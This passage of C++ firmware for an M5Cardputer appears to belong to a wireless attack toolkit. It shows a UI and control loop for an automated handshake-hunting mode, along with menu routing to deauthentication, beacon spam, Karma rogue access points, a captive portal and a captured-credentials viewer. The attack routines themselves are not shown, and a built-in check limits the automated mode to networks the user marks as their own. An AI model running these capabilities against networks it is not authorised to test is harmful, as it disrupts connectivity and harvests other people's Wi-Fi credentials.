    const char *face = autoStage == AutoStage::HUNT ? "(>_<)" : (autoStage == AutoStage::SCOUT ? "(o_o)" : "(-_-)");
    if (autoLastOkAt != 0 && now - autoLastOkAt < 5000) face = "(^o^)";
    d.setTextColor(COLOR_PRIMARY, COLOR_BG);
    d.setTextSize(2);
    d.drawString(stage, 6, 4);
    d.drawString(face, 150, 4);
    d.setTextSize(1);
    char line[64];
    int seen = apCount.load(std::memory_order_relaxed);
    int mine = 0;
    for (int i = 0; i < seen; i++) {
        if (isOwnBssid(apTable[i].bssid)) mine++;
    }
    snprintf(line, sizeof(line), "Networks seen %d   marked %d", seen, mine);
    d.drawString(line, 4, 26);
    snprintf(line, sizeof(line), "Handshakes saved %lu", (unsigned long)autoCaptures);
    d.drawString(line, 4, 38);
    if (autoStage == AutoStage::HUNT) {
        uint32_t elapsed = (now - autoStageStart) / 1000;
        long left = static_cast<long>(AUTO_HUNT_MS / 1000) - static_cast<long>(elapsed);
        if (left < 0) left = 0;
        snprintf(line, sizeof(line), "%.14s ch%d  %lds left", deauthSsid, deauthCh, left);
    } else if (autoFile[0] != '\0' && autoCaptures > 0) {
        snprintf(line, sizeof(line), "%s", autoFile);
    } else {
        snprintf(line, sizeof(line), "%s", autoMsg);
    }
    d.drawString(line, 4, 50);
    uint32_t total = autoStage == AutoStage::HUNT ? AUTO_HUNT_MS : (autoStage == AutoStage::SCOUT ? AUTO_SCOUT_MS : 1);
    uint32_t progressed = autoStage == AutoStage::IDLE ? 0 : (now - autoStageStart);
    if (progressed > total) progressed = total;
    int fill = static_cast<int>(progressed * 230 / total);
    d.drawRect(4, 64, 232, 8, COLOR_SECONDARY);
    if (fill > 0) d.fillRect(5, 65, fill, 6, COLOR_PRIMARY);
    d.setTextColor(COLOR_SECONDARY, COLOR_BG);
    if (autoStage == AutoStage::SCOUT) {
        d.drawString("Scan runs 60 s. Enter: review now", 4, 78);
    } else if (autoStage == AutoStage::HUNT) {
        d.drawString("Testing only networks you marked.", 4, 78);
    }
    d.drawString(autoStage == AutoStage::HUNT ? "Enter: stop test  Bksp back" : "Enter: review  Bksp back", 4, 124);
}

void tickKaijugotchi() {
    if (autoStage == AutoStage::IDLE) return;
    uint32_t now = millis();
    if (autoStage == AutoStage::SCOUT) {
        if (now - autoLastHop >= AUTO_HOP_MS) {
            autoLastHop = now;
            autoHopCh = autoHopCh >= CH_LAST ? CH_FIRST : autoHopCh + 1;
            setAnalyzerChannel(autoHopCh);
        }
        autoLogNew();
        if (now - autoStageStart >= AUTO_SCOUT_MS) enterReview();
    } else if (autoStage == AutoStage::REVIEW) {
        autoLogNew();
    } else if (autoStage == AutoStage::HUNT) {
        if (now - autoLastBurst >= AUTO_BURST_MS && now - autoStageStart < AUTO_DEAUTH_MS) {
            autoLastBurst = now;
            deauthBurst();
        }
        if (huntCrackable()) {
            endAutoHunt(true);
        } else if (now - autoStageStart >= AUTO_HUNT_MS) {
            endAutoHunt(false);
        }
    }
    if (now - autoLastDraw >= 1000) {
        autoLastDraw = now;
        drawKaijugotchi();
    }
}

bool wordHas(const std::vector<char> &word, char c) {
    for (char w : word) {
        if (tolower(w) == c) return true;
    }
    return false;
}

}  // namespace

void setup() {
    auto cfg = M5.config();
    M5Cardputer.begin(cfg, true);
    M5Cardputer.Display.setRotation(1);
    drawSplash();
    delay(2000);
    drawMenu();
}

void loop() {
    M5Cardputer.update();
    if (screen == Screen::WifiChannels) tickChannelAnalyzer();
    if (pcapActive.load(std::memory_order_acquire) && pcapBytes >= PCAP_MAX_BYTES) {
        stopPcap();
        snprintf(pcapMsg, sizeof(pcapMsg), "stopped: 4 MB limit");
    }
    if (screen == Screen::WifiSniff) {
        pcapFlush(8192);
        tickSniffer();
    }
    if (screen == Screen::WifiSpamRun) tickSpam();
    if (screen == Screen::WifiDeauthCheck) tickDeauthCheck();
    if (screen == Screen::WifiDeauthSelect) tickPmfPass();
    if (screen == Screen::WifiDeauthRun) tickDeauth();
    if (screen == Screen::WifiKarmaRun) tickKarma();
    if (screen == Screen::WifiHsRun) {
        pcapFlush(8192);
        tickHandshake();
    }
    if (screen == Screen::WifiPortalRun) tickPortal();
    if (screen == Screen::WifiAutoRun) {
        pcapFlush(8192);
        tickKaijugotchi();
    }
    if (!M5Cardputer.Keyboard.isChange() || !M5Cardputer.Keyboard.isPressed()) return;

    auto &ks = M5Cardputer.Keyboard.keysState();
    bool up = ks.up || wordHas(ks.word, ';') || wordHas(ks.word, 'w');
    bool down = ks.down || wordHas(ks.word, '.') || wordHas(ks.word, 's');
    bool back = ks.backspace || ks.esc;

    switch (screen) {
    case Screen::Menu:
        if (up) {
            selected = (selected + MENU_COUNT - 1) % MENU_COUNT;
            drawMenu();
        } else if (down) {
            selected = (selected + 1) % MENU_COUNT;
            drawMenu();
        } else if (ks.enter) {
            if (selected == WIFI_ITEM) {
                screen = Screen::WifiMenu;
                wifiToolSel = 0;
                wifiToolTop = 0;
                drawWifiMenu();
            }
        }
        break;

    case Screen::WifiMenu:
        if (back) {
            screen = Screen::Menu;
            drawMenu();
        } else if (up) {
            wifiToolSel = (wifiToolSel + WIFI_TOOL_COUNT - 1) % WIFI_TOOL_COUNT;
            if (wifiToolSel < wifiToolTop) wifiToolTop = wifiToolSel;
            if (wifiToolSel >= wifiToolTop + WIFI_MENU_ROWS) wifiToolTop = wifiToolSel - WIFI_MENU_ROWS + 1;
            drawWifiMenu();
        } else if (down) {
            wifiToolSel = (wifiToolSel + 1) % WIFI_TOOL_COUNT;
            if (wifiToolSel < wifiToolTop) wifiToolTop = wifiToolSel;
            if (wifiToolSel >= wifiToolTop + WIFI_MENU_ROWS) wifiToolTop = wifiToolSel - WIFI_MENU_ROWS + 1;
            drawWifiMenu();
        } else if (ks.enter) {
            if (wifiToolSel == WIFI_TOOL_SCAN) {
                screen = Screen::WifiScan;
                scanWifi();
            } else if (wifiToolSel == WIFI_TOOL_CHANNELS) {
                screen = Screen::WifiChannels;
                startChannelAnalyzer();
            } else if (wifiToolSel == WIFI_TOOL_SNIFF) {
                screen = Screen::WifiSniff;
                startSniffer();
            } else if (wifiToolSel == WIFI_TOOL_BEACON) {
                screen = Screen::WifiSpamSelect;
                spamMsg[0] = '\0';
                drawSpamSelect();
            } else if (wifiToolSel == WIFI_TOOL_DEAUTH) {
                screen = Screen::WifiDeauthSelect;
                listPurpose = PURPOSE_DEAUTH;
                enterDeauthSelect();
            } else if (wifiToolSel == WIFI_TOOL_HANDSHAKE) {
                screen = Screen::WifiDeauthSelect;
                listPurpose = PURPOSE_HANDSHAKE;
                enterScanList();
            } else if (wifiToolSel == WIFI_TOOL_AUTO) {
                screen = Screen::WifiAutoRun;
                drawKaijugotchi();
            } else if (wifiToolSel == WIFI_TOOL_CREDS) {
                screen = Screen::WifiCredsFiles;
                scanCredsFiles();
                drawCredsFiles();
            } else if (wifiToolSel == WIFI_TOOL_PORTAL) {
                screen = Screen::WifiDeauthSelect;
                listPurpose = PURPOSE_PORTAL;
                enterScanList();
            } else if (wifiToolSel == WIFI_TOOL_KARMA) {
                screen = Screen::WifiKarmaRun;
                startKarma();
            }
        }
        break;

    case Screen::WifiScan:
        if (back) {
            WiFi.scanDelete();
            screen = Screen::WifiMenu;
            drawWifiMenu();
        } else if (up) {
            moveWifiSelection(-1);
        } else if (down) {
            moveWifiSelection(1);
        } else if (ks.enter) {
            scanWifi();
        }
        break;

    case Screen::WifiChannels:
        if (back) {
            stopChannelAnalyzer();
            screen = Screen::WifiMenu;
            drawWifiMenu();
        }
        break;

    case Screen::WifiSniff:
        if (back) {
            stopSniffer();
            screen = Screen::WifiMenu;
            drawWifiMenu();
        } else if (ks.enter) {
            sniffHop = !sniffHop;
            sniffDwellStart = millis();
            drawSniffer();
        } else if (wordHas(ks.word, 'r')) {
            toggleRecording();
            drawSniffer();
        } else if (up) {
            moveSnifferChannel(-1);
        } else if (down) {
            moveSnifferChannel(1);
        }
        break;

    case Screen::WifiSpamSelect:
        if (back) {
            screen = Screen::WifiMenu;
            drawWifiMenu();
        } else if (up) {
            spamModeSel = (spamModeSel + SPAM_MODE_COUNT - 1) % SPAM_MODE_COUNT;
            spamMsg[0] = '\0';
            drawSpamSelect();
        } else if (down) {
            spamModeSel = (spamModeSel + 1) % SPAM_MODE_COUNT;
            spamMsg[0] = '\0';
            drawSpamSelect();
        } else if (ks.enter) {
            spamMode = static_cast<SpamMode>(spamModeSel);
            if (spamMode == SPAM_SINGLE) {
                spamTextLen = 0;
                spamText[0] = '\0';
                screen = Screen::WifiSpamText;
                drawSpamText();
            } else if (spamMode == SPAM_CUSTOM && !loadSpamCustom()) {
                drawSpamSelect();
            } else {
                screen = Screen::WifiSpamRun;
                drawSpamRun();
            }
        }
        break;

    case Screen::WifiSpamText:
        if (ks.esc) {
            screen = Screen::WifiSpamSelect;
            drawSpamSelect();
        } else if (ks.backspace) {
            if (spamTextLen > 0) {
                spamText[--spamTextLen] = '\0';
                drawSpamText();
            } else {
                screen = Screen::WifiSpamSelect;
                drawSpamSelect();
            }
        } else if (ks.enter) {
            if (spamTextLen > 0) {
                snprintf(spamBase, sizeof(spamBase), "%s", spamText);
                spamCounter = 1;
                screen = Screen::WifiSpamRun;
                drawSpamRun();
            }
        } else {
            bool changed = false;
            for (char c : ks.word) {
                if (spamTextLen < static_cast<int>(SPAM_BASE_MAX) && c >= 32 && c < 127) {
                    spamText[spamTextLen++] = c;
                    spamText[spamTextLen] = '\0';
                    changed = true;
                }
            }
            if (changed) drawSpamText();
        }
        break;

    case Screen::WifiSpamRun:
        if (back) {
            stopSpam();
            screen = Screen::WifiSpamSelect;
            drawSpamSelect();
        } else if (ks.enter) {
            if (spamRunning) {
                stopSpam();
            } else {
                startSpam();
            }
            drawSpamRun();
        } else if (wordHas(ks.word, 'h')) {
            spamHop = !spamHop;
            drawSpamRun();
        } else if (up || down) {
            if (!spamHop) {
                if (up) {
                    spamCh = spamCh <= CH_FIRST ? CH_LAST : spamCh - 1;
                } else {
                    spamCh = spamCh >= CH_LAST ? CH_FIRST : spamCh + 1;
                }
                setAnalyzerChannel(spamCh);
            }
            drawSpamRun();
        }
        break;
    case Screen::WifiDeauthSelect:
        if (pmfPassActive) {
            if (back) {
                stopPmfPass();
                drawDeauthSelect();
            }
            break;
        }
        if (back) {
            screen = Screen::WifiMenu;
            drawWifiMenu();
        } else if (up) {
            moveDeauthSelection(-1);
        } else if (down) {
            moveDeauthSelection(1);
        } else if (wordHas(ks.word, 'r')) {
            if (dlCount > 0) startPmfPass();
        } else if (wordHas(ks.word, 'o')) {
            if (dlCount > 0) {
                toggleOwnBssid(dlBssid[dlSel]);
                drawDeauthSelect();
            }
        } else if (ks.enter) {
            if (dlCount > 0) {
                chooseDeauthTarget();
                if (listPurpose == PURPOSE_HANDSHAKE) {
                    screen = Screen::WifiHsRun;
                    drawHandshake();
                } else if (listPurpose == PURPOSE_PORTAL) {
                    screen = Screen::WifiPortalRun;
                    startPortal();
                    drawPortal();
                } else {
                    screen = Screen::WifiDeauthCheck;
                    startDeauthCheck();
                }
            }
        }
        break;

    case Screen::WifiDeauthCheck:
        if (back) {
            stopDeauthCheck();
            screen = Screen::WifiDeauthSelect;
            drawDeauthSelect();
        } else if (wordHas(ks.word, 'r')) {
            stopDeauthCheck();
            startDeauthCheck();
        } else if (ks.enter && !checkActive && verdictAllowsDeauth(deauthVerdict)) {
            screen = Screen::WifiDeauthRun;
            drawDeauthRun();
        }
        break;

    case Screen::WifiDeauthRun:
        if (back) {
            stopDeauth();
            screen = Screen::WifiDeauthCheck;
            drawDeauthCheck();
        } else if (ks.enter) {
            if (deauthRunning) {
                stopDeauth();
            } else {
                startDeauth();
            }
            drawDeauthRun();
        }
        break;

    case Screen::WifiKarmaRun:
        if (back) {
            stopKarma();
            screen = Screen::WifiMenu;
            drawWifiMenu();
        } else if (ks.enter) {
            if (karmaRunning) {
                stopKarma();
            } else {
                startKarma();
            }
            drawKarmaRun();
        } else if (wordHas(ks.word, 'h')) {
            karmaHop = !karmaHop;
            drawKarmaRun();
        } else if (up || down) {
            if (!karmaHop) {
                karmaCh = up ? (karmaCh <= CH_FIRST ? KARMA_CH_MAX : karmaCh - 1)
                             : (karmaCh >= KARMA_CH_MAX ? CH_FIRST : karmaCh + 1);
                if (karmaRunning) setAnalyzerChannel(karmaCh);
            }
            drawKarmaRun();
        }
        break;

    case Screen::WifiHsRun:
        if (back) {
            stopHandshake();
            hsDeauth = false;
            screen = Screen::WifiDeauthSelect;
            drawDeauthSelect();
        } else if (ks.enter) {
            if (hsRunning) {
                stopHandshake();
            } else {
                startHandshake();
            }
            drawHandshake();
        } else if (wordHas(ks.word, 'd')) {
            hsDeauth = !hsDeauth;
            drawHandshake();
        }
        break;

    case Screen::WifiPortalRun:
        if (back) {
            stopPortal();
            screen = Screen::WifiDeauthSelect;
            drawDeauthSelect();
        } else if (ks.enter) {
            if (portalRunning) {
                stopPortal();
            } else {
                startPortal();
            }
            drawPortal();
        }
        break;

    case Screen::WifiCredsFiles:
        if (back) {
            screen = Screen::WifiMenu;
            drawWifiMenu();
        } else if (up) {
            if (credsFileSel > 0) credsFileSel--;
            drawCredsFiles();
        } else if (down) {
            if (credsFileSel < credsFileCount - 1) credsFileSel++;
            drawCredsFiles();
        } else if (ks.enter && credsFileCount > 0) {
            openCredsFile(credsFileSel);
            screen = Screen::WifiCredsView;
            drawCredsView();
        }
        break;

    case Screen::WifiCredsView:
        if (back) {
            screen = Screen::WifiCredsFiles;
            drawCredsFiles();
        } else if (up) {
            if (credsEntrySel > 0) credsEntrySel--;
            drawCredsView();
        } else if (down) {
            if (credsEntrySel < credsEntryCount - 1) credsEntrySel++;
            drawCredsView();
        }
        break;
    case Screen::WifiAutoRun:
        if (back) {
            stopKaijugotchi();
            screen = Screen::WifiMenu;
            drawWifiMenu();
        } else if (autoStage == AutoStage::REVIEW) {
            int count = apCount.load(std::memory_order_relaxed);
            if (up) {
                if (autoSel > 0) autoSel--;
                if (autoSel < autoTop) autoTop = autoSel;
                drawKaijugotchi();
            } else if (down) {
                if (autoSel + 1 < count) autoSel++;
                if (autoSel >= autoTop + AUTO_REVIEW_ROWS) autoTop = autoSel - AUTO_REVIEW_ROWS + 1;
                drawKaijugotchi();
            } else if (wordHas(ks.word, 'o')) {
                if (autoSel < count) toggleOwnBssid(apTable[autoSel].bssid);
                drawKaijugotchi();
            } else if (ks.enter) {
                startAutoTest();
                drawKaijugotchi();
            }
        } else if (autoStage == AutoStage::FINISHED) {
            if (ks.enter) {
                enterReview();
                drawKaijugotchi();
            }
        } else if (autoStage == AutoStage::HUNT) {
            if (ks.enter) {
                stopKaijugotchi();
                enterReview();
                drawKaijugotchi();
            }
        } else if (ks.enter) {
            if (autoStage == AutoStage::SCOUT) {
                enterReview();
            } else {
                startKaijugotchi();
            }
            drawKaijugotchi();
        }
        break;
    }
}
